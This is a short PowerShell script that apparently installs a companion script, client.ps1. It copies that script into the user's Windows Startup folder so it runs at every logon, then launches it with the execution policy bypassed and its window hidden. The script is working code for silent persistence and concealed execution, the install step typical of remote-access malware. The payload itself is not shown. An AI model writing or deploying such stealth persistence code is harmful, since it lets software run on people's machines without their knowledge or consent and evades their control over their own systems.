# Copy the client.ps1 to the startup directory
# C:\Users\<UserName>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
$sourcePath = "./client.ps1"
$startupPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\client_v3.ps1"
# Move-Item -Path $sourcePath -Destination $startupPath -Force
Copy-Item -Path $sourcePath -Destination $startupPath -Force

# Run the client.ps1 script at startup directory
Start-Process -FilePath "powershell.exe" -ArgumentList "-ExecutionPolicy Bypass -File `"$startupPath`"" -WindowStyle Hidden

#exit from this ps1 file
exit 0
